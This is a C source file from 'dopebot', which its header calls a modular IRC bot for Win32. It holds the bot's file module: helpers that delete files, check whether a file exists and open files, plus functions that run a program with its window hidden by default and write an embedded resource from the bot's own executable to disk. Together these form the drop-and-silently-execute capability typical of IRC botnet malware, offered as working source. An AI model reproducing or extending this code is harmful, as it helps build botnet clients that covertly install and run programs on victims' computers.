/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_FILE
#include "bot.h"

//Delete File
int delete_file(char *szPath)
{

#ifndef NO_DEBUG
		printf("[DEBUG] Deleting file, deletefile()...\n");
#endif

	if (!file_exists(szPath)) return 2;
	if (!DeleteFile(szPath)) return 1;
	else return 0;
}

//Execute File
bool execute_file(char *szPath, int iVisibility)
{
	BOOL b;
	PROCESS_INFORMATION pInfo;
	STARTUPINFO sInfo;

#ifndef NO_DEBUG
		printf("[DEBUG] Executing file, executeh()...\n");
#endif

		memset(&sInfo, 0, sizeof(sInfo));
		memset(&pInfo, 0, sizeof(pInfo));
		sInfo.cb = sizeof(STARTUPINFO);
		sInfo.dwFlags = STARTF_USESHOWWINDOW;
		sInfo.wShowWindow = SW_HIDE;
	if (iVisibility == 1) sInfo.wShowWindow = SW_SHOW;
		b = CreateProcess(NULL, szPath, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
	if (b == 0)
		return FALSE;
	else
		return TRUE;
}

//Extract Resource
bool extract_resource(char *szResName, char *szResType, char *szExtractPath)
{
	DWORD dwSize, dwWritten = 0;
	HANDLE hFile;
	HGLOBAL hResData;
	HMODULE hInstance = GetModuleHandle(NULL);
	HRSRC hResLocation;
	LPVOID pExe;

#ifndef NO_DEBUG
		printf("[DEBUG] Extracting resource, extract_resource()...\n");
#endif

		hResLocation = FindResource(hInstance, szResName, szResType);
		dwSize = SizeofResource(hInstance, hResLocation);
		hResData = LoadResource(hInstance, hResLocation);
		pExe = LockResource(hResData);
	if (pExe == NULL) return FALSE;
		hFile = CreateFile(szExtractPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
		WriteFile(hFile, pExe, dwSize, &dwWritten, NULL);
	if (dwWritten != dwSize) return FALSE;
		CloseHandle(hFile);
		return TRUE;
}

//File Exists
bool file_exists(char *szPath)
{
	HANDLE hFile;

#ifndef NO_DEBUG
		printf("[DEBUG] Checking if file exists, file_exists()...\n");
#endif

		hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
			CloseHandle(hFile);
			return FALSE;
	}
		CloseHandle(hFile);
		return TRUE;
}

//Open File
bool open_file(char *szPath)
{
	int i;
		i = (int)ShellExecute(0, "open", szPath, NULL, NULL, SW_SHOW);
	if (i >= 32)
		return TRUE;
	else
		return FALSE;
}
#endif